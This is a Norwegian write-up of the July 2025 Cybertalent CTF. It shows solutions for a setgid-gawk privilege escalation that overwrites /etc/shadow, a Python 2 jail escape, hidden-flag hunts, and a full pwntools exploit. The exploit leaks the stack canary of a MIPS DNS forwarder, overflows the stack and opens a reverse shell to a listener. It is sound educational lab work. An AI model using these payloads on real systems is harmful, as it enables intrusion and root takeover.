# Cybertalent CTF, julen 2025

Etter ett års opphold var E-tjenesten sin CTF endelig tilbake, og denne gangen med ny plattform og litt annen struktur på oppgavene. I år måtte man løse (nesten) alle de grunnleggende oppgavene før man fikk prøve seg på oppdraget, og selve oppdraget var mindre lineært enn tidligere. De grunnleggende oppgavene var i hovedsak veldig enkle til middels vanskelige, mens oppdraget jevnt over lå på en høyere vanskelighetsgrad igjen.

Jeg rakk ikke starte med write-ups før serverne gikk ned, så oppgavene jeg kan dokumentere er begrenset til de som jeg har gode notater på.

## Grunnleggende Oppgaver

### 1.6 Unchained

Her logger vi inn med SSH og målet er å lese en fil i hjemmekatalogen som er eid av root. Vi må finne en måte å elevere rettighetene våre på, og sjekker derfor om vi har noen interessante ting i `sudo -l`, men det har vi ikke. Deretter søker vi etter filer med hhv. setuid og setguid vha.
`find / -perm -4000` og `find / -perm -2000` og finner at `gawk` har setgid til root. Å lese en fil med gawk er så enkelt som `gawk '//' filnavn_her`, og vi kan også elevere til root på serveren ved å overskrive `/etc/shadow`.

```bash
$ gawk -v LFILE=/etc/shadow 'BEGIN { print "root:$6$SALTsalt$UiZikbV3VeeBPsg8./Q5DAfq9aj7CVZMDU6ffBiBLgUEpxv7LMXKbcZ9JSZnYDrZQftdG319XkbLVMvWcF/Vr/:20438:0:::::" > LFILE }'
$ su # 'password'
```

## Oppdrag

### 2.13 Nissens slemmefengsel

```python
...
sys.stderr.write('Skriv inn ønskelisten din: ')
i = raw_input()

if len(i) > 35:
    sys.stderr.write('Ønskelisten din er for lang\n')
    sys.exit(1)

for c in 'cybertalent \\^_^/':
    if c in i:
        sys.stderr.write('Ønskelisten din inneholder ønsker som ikke er tillatt\n')
        sys.exit(1)

try:
    _ = eval(eval(i, {}, {}), {}, {})
    sys.stderr.write('Nissen har mottatt ønskelisten din\n')
except:
    sys.stderr.write('Nissen kunne ikke lese ønskelisten din\n')
```

Python jail med en tvist. Her kjøres første beta-versjonen av Python, hvor svært lite er implementert enda. Vi får en gratis dobbel `eval`, men må ha en payload som er maksimalt 35 tegn og ingen av de kan være inni strengen `cybertalent \\^_^/`. Starter vi opp en terminal og lister ut alle builtins, er det bare én av disse som kan skrives uten disse bokstavene: `divmod`. Husker man tilbake til Python 2-dagene så er `input()` det samme som `eval(raw_input())`, så hvis vi klarer å lage en string som sier `input()` inni det første kallet til `eval()` vil det andre kallet utføre `eval("input()")` som til slutt vil kalle `input()`, hvor vi kan kjøre kode uten noen lengebegrensninger.

For å skrive `input()` må vi finne en måte å skrive `in` og `t` på. Filteret tillater nemlig allerede `pu` og `()`. I eldre Python kan man også bruke "\`" til å gjøre om objekter til sin string-representasjon. Kaller vi \`divmod\` for eksempel vil dette bli til `<built-in function divmod>` og der har vi både en `in` og en `t`. Endelig payload blir derfor

```python
`divmod`[7:9]+'pu'+`divmod`[5]+'()'
```

Etter dette må vi taste inn en payload til for å lese flagget. Her følger vi resten av scriptet og bruker `sys.stderr.write` for output i stedet for `print`.

```python
sys.stderr.write(open('/flag.txt','r').read(100))
```

## 2.16 Hjemmesnekra DNS

> Vi har klart å få tak i en kopi av DNS-videresenderen som kjører på ruteren til GooodGames.
> Ved første øyekast ser det ut til at DNS-videresenderen er proprietær og kan være sårbar. Se om du kan finne få tilgang til ruteren, og undersøk om du finner noe mistenkelig på den.

Her har vi en MIPSEL-binary som kjører en DNS-forwarder på UDP port 53. Binary har stack canaries påskrudd, men ikke N^X så vi kan kjøre kode på stacken om vi lekker ut canary.

Denne oppgaven var litt tricky uten å helt vite hvilken versjon av QEMU og hvilke versjoner av libraries som ble brukt på remote. I tillegg oppførte serveren seg annerledes enn lokalt, fordi den kunne faktisk ikke klarte å forwarde noe til `1.1.1.1`. For å replikere remote måtte jeg derfor bruke Debian sin siste Qemu for MIPS lokalt (samme som Corax kjører) og stenge for at serveren kunne forwarde. Dette gjorde jeg ved å binærpatche programmet til å sende til `0.0.0.0` i stedet. Samtidig endret jeg port til `54` lokalt for å unngå trøbbel med lokal DNS.

Her er solve script, og forklaring følger.

```python
from pwn import *
from time import sleep

#r = remote("hjemmesnekra-dns", 53, typ='udp')
r = remote("127.0.0.1", 54, typ='udp')
context.arch = 'mips'

try:
    buf = asm(shellcraft.linux.connect("127.0.0.1", 4444))
    buf += asm(shellcraft.linux.dupsh())
except:
    buf = bytes.fromhex("...")


# print(len(buf))
print(buf.hex())

#### Leak stack cookie
pload = b""
pload += p16(0x3713) # Transaction id
pload += p16(0x2001) # Flags
pload += p16(1)[::-1]# qd_count
pload += p16(0)      # an_count
pload += p16(0)      # ns_count
pload += p16(0)      # ar_count
pload += bytes([193, 186]) + b"_"
pload += b"\x00"

pload += p16(0x0001) # Type
pload += p16(0x0001) # Class

r.send(pload)
data = r.recv()
print(data)
cookie = u32(data[41:45])
leak = u32(data[76:80])
print("Cookie", hex(cookie))
print("Leak", hex(leak))
##################

### recv(3, $t0, 0x200, 0) UDP stager
shellcode = b""
shellcode += bytes.fromhex("00 FC BD 27") # addiu $sp, $sp, -0x400
shellcode += bytes.fromhex("4F 10 02 24") # li $v0, 0x104f # recv (0x104f)
# shellcode += bytes.fromhex("05 00 04 24") # li $a0, 5 (fd = 5) if debugging
shellcode += bytes.fromhex("03 00 04 24") # li $a0, 3 (fd = 3) if not debugging
shellcode += bytes.fromhex("25 28 00 01") # move $a1,$t0
shellcode += bytes.fromhex("00 02 06 24") # li $a2 , 0x200
shellcode += bytes.fromhex("00 00 07 24") # li $a3 ,0  # flags
shellcode += bytes.fromhex("0c 01 01 01") # syscall

STACK = leak - 560

pload = b""
pload += p16(0x3713) # Transaction id
pload += p16(0x2001) # Flags
pload += p16(1)[::-1]# qd_count
pload += p16(0)      # an_count
pload += p16(0)      # ns_count
pload += p16(0)      # ar_count
pload += b"\x40" + shellcode.ljust(0x40, b"\x00")
pload += b"\x40" + b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg" + p32(STACK+len(shellcode)) + b"lmnopqrstuvwxyz0123456789zz"
pload += b"\x40" + b"aa"
pload += p32(cookie) # stack cookie
pload += b"aaba" # S8
pload += p32(STACK) # return pointer

pload += b"\x00"
pload += p16(0x0001) # Type
pload += p16(0x0001) # Class
pload += shellcode

print(f"{shellcode.hex()=}")
print(f"{len(pload)=}")
r.send(pload)
for _ in range(4):
    r.send(buf)
    sleep(1)
```

Exploiten er i 3 deler. Først sender vi en request som bruker 2-byte lengde, etterfulgt av ikke nok data. Dette gjør at serveren tror at den må sende en lang response tilbake igjen, uten å sjekke at lengden på input er stor nok. Slutten blir derfor fylt opp av data fra stacken til serveren, hvor vi finner både stack canary og en stack-adresse som vi trenger senere for å vite hvor vi skal hoppe.

Del 2 er å utføre en buffer overflow der vi bruker leaks til å hoppe til vår egen kode på stacken. Fordi selve overflowen tar opp mye plass, og serveren kun leser inn 256 bytes, er payloaden i første omgang en stager som leser inn mer data. Den kaller bare `recv(3, stack+offset, 0x200, 0)` hvor offset er slik at det som leses inn havner rett bak stageren og blir en fortsettelse av den. Her må man forstå at file descriptor for socketen er 3 hvis man kjører serveren normalt, men om man debugger den via QEMU så åpnes to ekstra sockets for debuggeren og da blir den 5 i stedet.

Del 3 er selve payloaden, som pwntools fint klarer å bygge for oss via shellcraft. Her må man huske å endre IP til sin lokale Corax-IP og lytte på port 4444 før man kjører exploiten. Payloaden sendes inn over UDP og starter et reverse shell.

## Skjulte flagg

### 4.1 environ
Hint på hjemmesiden viser at denne heter environ, og gir hintet `ls -lah /proc/self/environ`. Hvis man kjører en `which ls` på Corax ligger denne mystisk nok i `/usr/local/bin` og ikke `/usr/bin`, hvor det også ligger en `ls` til. Disse programfilene er ikke lesbare, så man kan ikke direkte bruke `strings` eller `cat` på de, men man kan eksekvere programmet via tracing og se hva de gjør. Denne spesielle varianten av `ls` legger inn en environment variable kalt `FLAGG`, og så kaller den `/usr/bin/ls` etterpå med samme argumenter. Det vil si at hver gang man kjører `ls` eller `/usr/local/bin/ls` vil man få med et flagg inne i miljøvariablene et sted. En metode å lese ut dette på er å starte en rekursiv ls på hele `/`, merke seg PID for prosessen, og kalle `cat /proc/<pid>/environ`. Da får man ut dette flagget.

### 4.2 Scoreboard SQL injeksjon

Denne får man om man forsøker å bruke SQL injection når man kaller `scoreboard`-programfilen.

> Hvem vet, plutselig hadde det fungert!

### 4.3 flag_submitter skjult rute

Vet ikke helt hvordan det var ment å finne denne, men jeg dumpet koden for `scoreboard` og fant ut at flagg sendes inn ved å POSTe de til `http://ctf-flag-submitter.ctf-system.svc.cluster.local:8000` sammen med userid og enkodet flagg. Ved å bare GETe denne URLen fikk man et flagg.

> Det som skiller Ola Nordmann fra deg, er nysgjerrigheten - motet til å prøve, og viljen til å feile mye.

### 4.4 CSP Policy

På hjemmesiden til Cybertalent-konkurransen kunne man se at CSP-headeren pekte på et eldre domene brukt til utvikling. Dette domenet var på flaggformat.

> Du finner digitale spor over alt! Dette er siden vi brukte under utvikling av plattformen.

### 4.5 pow_bg.wasm

"Proof-of-Work"-siden blir alle sendt til første gang de starter plattformen. Inni WASM-programmet som kjører på denne siden var det enda et flagg.

> Du er virkelig nysjerrig du! Kanskje du passer inn hos oss?


### 4.6 Winner of Vexillum

Som hintet til i `LESMEG.md` på Vexillum-spillet var det to flagg i denne. Dessverre virket ikke spillet helt som tiltenkt først, og det ble patchet et godt stykke ut i konkurransen før det fungerte igjen. Inntil da kræsjet spillet hver gang man forsøkte å kombinere ulike objekter, men bare om de hadde en slags interaksjon. Jeg brute-forcet alle interaksjonene og fant alle som kræsjet, og forsøkte så å gjøre de i en "korrekt" rekkefølge uten hell. Etter at oppgaven ble fikset kjørte jeg det samme scriptet og fikk ut flagget nesten umiddelbart.

> Det virker til at ikke alle spill har like godt sikret nettrafikk... Bra jobbet!

senere endret til

> Håper du likte spillet! Flashbacks til 70-, 80- og 90-tallet er slett ikke uvanlig.